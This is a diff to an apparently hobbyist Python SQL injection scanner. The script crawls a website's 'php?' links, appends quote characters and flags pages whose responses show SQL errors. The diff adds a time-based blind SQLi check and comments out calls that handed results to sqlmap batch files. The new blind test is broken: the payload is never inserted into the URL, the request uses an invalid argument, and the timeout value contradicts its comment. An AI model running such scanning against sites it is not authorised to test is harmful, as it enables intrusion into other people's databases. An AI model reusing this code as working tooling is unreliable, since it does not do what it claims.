@@ -1,23 +1,41 @@
 #Python3.9
-#Python3.9
 import requests 
 from bs4 import BeautifulSoup
 from lxml import html, etree
 import sys, fnmatch, threading
 import re, os
-#use ./sqleye.py website (or ip)
-### add user agent sqli and check all textbox vectors 
+### i could make this code clean, but i didnt.
 def presentation():
 
     print("   ##############################################")
     print("   #                                            #")
-    print("   #         eye spy with my little eye a sqli  #")
-    print("   #     ~00xZ-       github.com/00xZ           #")
+    print("   #          I spy with my little SQL eye      #")
+    print("   #     ~Eyezik      github.com/00xZ           #")
     print("   #                                            #")
-    print("   #  v2.2         Use: -h for help             #")
+    print("   #  v2.6         Use: -h for help             #")
     print("   #                                            #")
     print("   ##############################################")
-
+def blind_sql_test(okay, proxy):
+    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36", "Content-Type":"sqli"}
+    payload_file = open("blind_payloads_sqli")
+    for payload in payload_file.readlines():
+        sqli = payload.strip("\n")
+        blind_url = okay
+        print("       [+] "+blind_url +" : Blind SQLi")
+        isitblind = requests.get(blind_url, timeout=30, headers=headers, proxies=proxy, follow_redirects=True)
+        print("con")
+        the_time = (isitblind.elapsed.total_seconds())
+        print(the_time)
+        if (the_time) > (float(60)): # change the 6 to any timeout you want depending on payloads
+            try:
+                print ("Found SQLi: "+ blind_url)
+                xx = open("vulnSQLi.txt", "a+")
+                xx.write(blind_url + "\n")
+                xx.close
+            except: pass
+        else: 
+             print("       [-] None found.")
+                
 def gethref(site, proxy):
     headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36", "Content-Type":"text"}
     ur = (site)
@@ -27,10 +45,11 @@ def gethref(site, proxy):
         soup = BeautifulSoup(req.text, 'html.parser')
         for link in soup.select('a[href*="php?"]'):
             okay = (link["href"])
+            #print(okay)
             serv = (okay + "'")
             try:
                 urlIIQ = bool(ur in okay)#Url Is In Quiry
-                print(urlIIQ)
+                #print(urlIIQ) debug
                 if urlIIQ == False:
                     okay = (ur + "/" + okay)
                 else: pass
@@ -38,7 +57,7 @@ def gethref(site, proxy):
             fo1 = open("maybeSQLi.txt", "a+")
             fo1.write(serv + "\n")
             fo1.close 
-            print("      [+] Sending payload " + serv)
+            print("      [+] Sending payload " + okay)
             reeqee = requests.get(serv, timeout=6, headers=headers, proxies=proxy)
             souper = BeautifulSoup(reeqee.text, "html.parser")
             if souper(text=lambda t: "SQL" in t):
@@ -46,12 +65,14 @@ def gethref(site, proxy):
                 fo = open("vulnSQLi.txt", "a+")
                 fo.write(serv + "\n")
                 fo.close
-                os.system('mapit2.bat "' + okay + '"')
+                # os.system('mapit2.bat "' + okay + '"') i added this to send it to sqlmap 
             else:
-                os.system('mapit.bat "' + okay + '"')
-                print("   [x] Found SQLi Input but not exploitible [x] : " + serv )
-                pass 
+                # os.system('mapit.bat "' + okay + '"') this as a backup for my code is shit
+                print("   [x] Testing Blind SQLi [x] : " + serv )
+                blind_sql_test(okay, proxy)
+            pass
     except:
+        blind_sql_test(okay, proxy)
         print("  [!] Timed out after timeout check maybe change timeout in script: " + ur)
 
 
